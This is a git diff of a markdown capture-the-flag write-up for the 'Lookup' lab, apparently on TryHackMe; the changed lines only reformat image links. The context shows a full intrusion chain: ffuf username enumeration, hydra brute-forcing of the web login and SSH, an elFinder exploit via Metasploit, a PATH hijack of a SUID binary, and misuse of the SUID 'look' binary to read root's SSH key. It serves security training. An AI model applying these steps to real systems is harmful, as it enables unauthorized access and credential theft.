@@ -34,8 +34,8 @@ So intercept the login request with burpsuite and copy the request file for fuzz
 ffuf -request login.txt -w /usr/share/wordlists/SecLists-master/Usernames/Names/names.txt -u http://lookup.thm/login.php -fr "username"
 ```
 
-Recovered usernames: 
-![[lookup12.png]]
+Recovered usernames: <br/>
+![](Assets/lookup12.png)<br/>
 
 Now brute force the login page with found usernames using hydra and rockyou.txt. 
 ```bash
@@ -47,20 +47,20 @@ Recovered password is:
 [80][http-post-form] host: lookup.thm   login: jose   password: password123
 ```
 
-Using the credentials login to the page and end up in here:
-![[lookup1.png]]
+Using the credentials login to the page and end up in here:<br/>
+![](Assets/lookup1.png)<br/>
 
-Then added the `files.lookup.thm` in the `/etc/hosts` file. And Tried again.
-![[lookup2.png]]
+Then added the `files.lookup.thm` in the `/etc/hosts` file. And Tried again.<br/>
+![](Assets/lookup2.png)<br/>
 
-Check for the versions of elfinder
-![[lookup3.png]]
+Check for the versions of elfinder<br/>
+![](Assets/lookup3.png)<br/>
 
-Exploit 
-![[lookup4.png]]
+Exploit <br/>
+![](Assets/lookup4.png)<br/>
 
-Exploit using metasploit:
-![[lookup5.png]]
+Exploit using metasploit:<br/>
+![](Assets/lookup5.png)<br/>
 
 
 #### Local privilege escalation  
@@ -106,10 +106,10 @@ fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
 mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-Files in `/home/think`
-![[lookup6.png]]
+Files in `/home/think` <br/>
+![](Assets/lookup6.png)<br/>
 
-SUID files 
+SUID files <br/>
 ```bash
 www-data@lookup:/tmp$ find / -perm -u=s -type f 2>/dev/null
 /snap/snapd/19457/usr/lib/snapd/snap-confine
@@ -154,24 +154,24 @@ www-data@lookup:/tmp$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/umount
 ```
 
-Interesting file `/usr/sbin/pwm`
-![[lookup7.png]]
-It executes id command and then in that id looks for `/home/<id>/.passwords` file. 
+Interesting file `/usr/sbin/pwm` <br/>
+![](Assets/lookup7.png)<br/>
+It executes id command and then in that id looks for `/home/<id>/.passwords` file. <br/>
 
-Now execute the following command to add `/tmp` to `PATH` variable.
+Now execute the following command to add `/tmp` to `PATH` variable.<br/>
 And copy the `/usr/bin/id` to `/tmp` directory.
 ```bash
 cp /usr/bin/id /tmp
 export PATH=/tmp:$PATH
 ```
 
-Now edit the `id` file. Insert the following
+Now edit the `id` file. Insert the following <br/>
 ```bash
 #!/bin/bash
 echo "uid=33(think) gid=33(think) groups=33(think)"
 ```
 
-Now run `/usr/sbin/pwm`
+Now run `/usr/sbin/pwm` 
 ```bash
 www-data@lookup:/tmp$ /usr/sbin/pwm
 [!] Running 'id' command to extract the username and user ID (UID)
@@ -227,14 +227,14 @@ jose.9298
 jose.2856171
 ```
 
-Now brute-force ssh with the obtained password using hydra:
-![[lookup8.png]]
-Password is: josemario.AKA(think)
+Now brute-force ssh with the obtained password using hydra: <br/>
+![](Assets/lookup8.png)<br/>
+Password is: josemario.AKA(think)<br/>
 
-![[lookup9.png]]
+![](Assets/lookup9.png)<br/>
 
 #### Being Root 
-![[lookup10.png]]
+![](Assets/lookup10.png)<br/>
 
 from [gtfobins](https://gtfobins.github.io/gtfobins/look/#suid)
 `/usr/bin/look '' <file_name>`
@@ -291,4 +291,4 @@ chmod 600 root_rsa
 ssh root@<ip> -i root_rsa
 ```
 
-![[lookup11.png]]
+![](Assets/lookup11.png)
